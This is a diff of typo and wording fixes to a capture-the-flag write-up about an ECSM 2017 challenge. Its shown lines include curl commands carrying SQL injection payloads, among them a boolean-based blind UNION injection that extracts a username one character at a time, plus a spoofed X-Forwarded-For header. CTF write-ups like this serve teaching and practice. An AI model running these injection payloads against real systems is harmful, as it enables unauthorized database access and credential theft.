@@ -330,7 +330,7 @@ Let's take a closer look at this part of code:
         $data = $result->fetchAll();
 ```
 
-So we are dealing with __SQLite__ database and ```SELECT``` query contains obvious ___SQL Injection__ vulnerability - value we pass as ```$login``` is used in SQL query without any sanitization. Let's exploit this flaw, again using ```curl```:
+So we are dealing with __SQLite__ database and ```SELECT``` query contains obvious __SQL Injection__ vulnerability - value we pass as ```$login``` is used in SQL query without any sanitization. Let's exploit this flaw, again using ```curl```:
 
 ```
 $ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='1":password  http://ecsm2017.cert.pl:6044/index.php/instructions
@@ -492,7 +492,7 @@ And we're in! See ```<h2>안녕하십니까</h2><h3>메시지 없음</h3>``` in 
 
 
 Ok, that SQL Injection payload might look complicated, let's take a look at it little bit closer:
-First, full ```curl`` command:
+First, full ```curl``` command:
 
 
 ```
@@ -536,13 +536,13 @@ if (!$result) { die($db->errorInfo()[2]); }
 $data = $result->fetchAll();
 ```
 
-"But we already get $data from this query, did't we?@ you might ask.
+*"But we already get $data from this query, did't we?"* you might ask.
 
 Yes, you're correct, but as we pass fake username and password, ```message``` column contains NULL. It will contain legitimate data only for username, which exists in database.
 
-So let's use SQL Injection we've found and let's try to extract some username. Problem is that we do not get any readable feedback from backend, so any ```UNION``` based injections won't work as we expect. Good news is we can still use ```UNION```, however we need to extract data character by character, using comparision between valid and invalid response from the server.
+So let's use SQL Injection we've found and let's try to extract some username. Problem is that we do not get any readable feedback from backend, so any ```UNION``` based injections won't work as we expect. Good news is we can still use ```UNION```, however we need to extract data character by character, using comparision between valid and invalid response from the server. This technique is known as __Boolean Based SQL Injection__.
 
-First, let's see how correct request looks like. I've used ```admin``` here as example, but actually, I guessed existing username and I get response which means ```admin``` user was found in database:
+First, let's see how correct request looks like. I've used username ```admin``` here as example, but actually this 'example' I guessed is already existing username and I get response which means ```admin``` user was found in database:
 
 
 ```
@@ -591,7 +591,7 @@ body { background-color: #AA0000; color: white; font-size: 300%;}
 __SPOILER__: no, ```admin``` user does not have any message saved in database.
 
 
-Now, let's try some not existing username:
+Now, let's try some not existing username (```Korg```):
 
 ```
 $ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT login FROM users LIMIT 1)='Korg' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--":password  http://ecsm2017.cert.pl:6044/index.php/instructions
@@ -638,9 +638,9 @@ body { background-color: #AA0000; color: white; font-size: 300%;}
 </html>
 ```
 
-This time we get ```HTTP/1.0 401 Unauthorized``` response, so our injected query is false.
+This time we get ```HTTP/1.0 401 Unauthorized``` response, so our injected query is false. ```Korg``` is not a valid username.
 
-Ok, now when we know how to distinct between valid and invalid queries, let's start username extraction. To do this, I've prepared simple Python expolit, which iterates over character set:
+Ok, now when we know how to distinct between valid and invalid queries, let's start username extraction. To do this, I've prepared simple Python expolit, which iterates over character set and build username when request with character used in query returns ```200 OK``` HTTP response:
 
 ```Python
 #!/usr/bin/env python
@@ -673,7 +673,7 @@ print '[+] finished!!!'
 ```
 
 
-Although script is rather self-explanatory, here is fragment of its ouptut during username extraction process:
+Script is rather self-explanatory, here is fragment of its ouptut during username extraction process:
 
 ```
 $ ./sqli.py
@@ -711,9 +711,9 @@ The flag: __ecsm{cyber.szpiegostwo}__ (Eng: 'cyber.spying')
 
 ## Summary
 
-That was very interesting challenge, contains many security vulnerabilities and, probably, more than one path to get to the final solution. If you solved this challeng in other way - let me know how did you do this :)
+That was very interesting challenge, contains many security vulnerabilities and, probably, more than one path to get to the final solution. If you solved this challenge in other way - let me know how did you do this :)
 
-I hope you have learnt something new reading my writeup (if you were not already familiar with techniques presented here). As always - any feedback warm welcome, just ping me on Twitter at https://twitter.com/_bl4de
+I hope you have learned something new reading my writeup (if you were not already familiar with techniques presented here). As always - any feedback warm welcome, just ping me on Twitter at https://twitter.com/_bl4de
 
 Stay Safe!
 
